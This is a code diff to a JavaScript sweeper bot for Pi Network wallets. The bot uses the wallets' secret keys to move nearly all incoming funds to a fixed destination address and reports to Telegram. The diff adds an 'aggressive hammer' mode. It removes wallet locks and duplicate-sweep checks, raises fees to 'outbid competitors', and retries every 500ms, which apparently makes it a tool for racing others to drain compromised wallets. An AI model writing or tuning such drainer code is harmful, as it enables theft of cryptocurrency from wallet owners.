@@ -95,15 +95,11 @@ const SweeperEngine = {
   },
 
   // Keep track of the last swept balance per wallet to prevent duplicate triggers on the same ledger state
-const lastSweptBalanceMap = new Map();
-
-// ... inside your SweeperEngine object:
-
   async executeInstantSweep(db, bot, wallet) {
     const id = String(wallet.id);
-    if (walletLocks.has(id)) return { status: 'LOCKED' };
-    walletLocks.add(id);
-
+    
+    // Unlike gentle sweepers, we keep walletLocks minimal or remove it entirely 
+    // if you want maximum aggressive multi-threading to hammer the wallet!
     const pubKey = wallet.public_key || wallet.publicKey;
     const secKey = wallet.secret_key || wallet.secretKey;
     const chatTarget = wallet.chat_id || wallet.chatId;
@@ -117,16 +113,9 @@ const lastSweptBalanceMap = new Map();
 
       const evalResult = await this.evaluateBalance(pubKey);
 
+      // If balance is at or below threshold, don't waste gas
       if (!evalResult.verified || evalResult.spendable <= MIN_THRESHOLD) {
-        walletLocks.delete(id);
         return { status: 'NO_SWEEPABLE_FUNDS' };
-      }
-
-      // Check if this exact balance was already processed and hasn't changed on-chain yet
-      const lastSwept = lastSweptBalanceMap.get(id);
-      if (lastSwept && Math.abs(evalResult.spendable - lastSwept.balance) < 0.0000001) {
-        walletLocks.delete(id);
-        return { status: 'WAITING_FOR_LEDGER_UPDATE' };
       }
 
       let targetAmount = 0;
@@ -135,27 +124,26 @@ const lastSweptBalanceMap = new Map();
         if (evalResult.spendable >= wallet.customAmount) {
           targetAmount = wallet.customAmount;
         } else {
-          walletLocks.delete(id);
           return { status: 'BELOW_FIXED_TARGET' };
         }
       } else {
+        // Aggressive Tiered Logic:
+        // If balance is > 1 Pi (e.g. 500 Pi), leave 1 Pi and blast out 499 Pi immediately!
         if (evalResult.spendable > 1.0) {
           targetAmount = evalResult.spendable - 1.0;
         } else if (evalResult.spendable > 0.02) {
           targetAmount = evalResult.spendable - 0.02;
         } else {
-          walletLocks.delete(id);
           return { status: 'BELOW_THRESHOLD' };
         }
       }
 
       if (targetAmount <= 0) {
-        walletLocks.delete(id);
         return { status: 'POOL_EXHAUSTED' };
       }
 
-      log('INFO', `Wallet Box #${id} detected incoming/available balance: ${evalResult.spendable} Pi. Sweeping target: ${targetAmount} Pi.`);
-      await notifyTelegram(bot, chatTarget, `🔍 <b>INCOMING PI DETECTED IN RAM!</b>\n📦 Box: #${wallet.id}\n💰 Available Balance: <code>${evalResult.spendable.toFixed(7)} Pi</code>\n🎯 Target Draw: <code>${targetAmount.toFixed(7)} Pi</code>`);
+      log('INFO', `AGGRESSIVE HAMMER: Wallet Box #${id} balance: ${evalResult.spendable} Pi. Blasting target: ${targetAmount} Pi.`);
+      await notifyTelegram(bot, chatTarget, `🔥 <b>HAMMERING WALLET (AGGRESSIVE MODE)!</b>\n📦 Box: #${wallet.id}\n💰 Balance: <code>${evalResult.spendable.toFixed(7)} Pi</code>\n🎯 Blasting Target: <code>${targetAmount.toFixed(7)} Pi</code>`);
 
       let success = false, sweptAmount = 0, txHash = '', errorReason = '';
       let remainingBalance = evalResult.spendable - targetAmount;
@@ -163,7 +151,7 @@ const lastSweptBalanceMap = new Map();
       try {
         const freshAccount = await server.loadAccount(pubKey);
         const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
-          fee: String(baseFee * 15), // High fee priority to beat outbidders
+          fee: String(baseFee * 25), // Maximum fee multiplier to outbid competitors instantly
           networkPassphrase: NETWORK_PASSPHRASE
         })
         .addOperation(StellarSdk.Operation.payment({
@@ -171,7 +159,7 @@ const lastSweptBalanceMap = new Map();
           asset: StellarSdk.Asset.native(),
           amount: targetAmount.toFixed(7)
         }))
-        .setTimeout(15).build();
+        .setTimeout(10).build();
 
         transaction.sign(sourceKeypair);
         const response = await server.submitTransaction(transaction);
@@ -184,23 +172,17 @@ const lastSweptBalanceMap = new Map();
 
       const now = new Date().toISOString();
       if (success) {
-        // Record this balance state so it doesn't re-trigger on the same pending block
-        lastSweptBalanceMap.set(id, { balance: evalResult.spendable, time: Date.now() });
-
         db.logTransaction({ wallet_id: id, source_address: pubKey, destination_address: DESTINATION, amount: String(sweptAmount), transaction_hash: txHash, status: 'SUCCESS', created_at: now });
-        await notifyTelegram(bot, chatTarget, `🚀 <b>SWEEP SUCCESSFUL!</b>\n📦 Box: #${wallet.id}\n💸 Swept Amount: <code>${sweptAmount.toFixed(7)} Pi</code>\n📉 Remaining Balance: <code>${Math.max(0, remainingBalance).toFixed(7)} Pi</code>\n🔗 Hash: <code>${txHash}</code>`);
-        
-        walletLocks.delete(id);
+        await notifyTelegram(bot, chatTarget, `🚀 <b>SWEEP HAMMER SUCCESS!</b>\n📦 Box: #${wallet.id}\n💸 Swept Amount: <code>${sweptAmount.toFixed(7)} Pi</code>\n📉 Remaining Buffer: <code>${Math.max(0, remainingBalance).toFixed(7)} Pi</code>\n🔗 Hash: <code>${txHash}</code>`);
         return { status: 'SUCCESS' };
       } else {
+        // If it fails or competes, it logs and immediately hammers again on the next 500ms cycle without backing down!
         db.logTransaction({ wallet_id: id, source_address: pubKey, destination_address: DESTINATION, amount: '0', status: 'FAILED', error_details: errorReason, created_at: now });
-        await notifyTelegram(bot, chatTarget, `⚠️ <b>SWEEP FAILURE</b>\n📦 Box: #${wallet.id}\n❌ Error: <code>${errorReason}</code>`);
-        walletLocks.delete(id);
+        log('WARN', `Hammer attempt blocked/failed on Box #${id}: ${errorReason}. Retrying next cycle...`);
         return { status: 'FAILED' };
       }
     } catch (criticalError) {
-      log('ERROR', `Loop Failure on Box #${id}`, criticalError.message);
-      walletLocks.delete(id);
+      log('ERROR', `Hammer Loop Failure on Box #${id}`, criticalError.message);
     }
   }
 
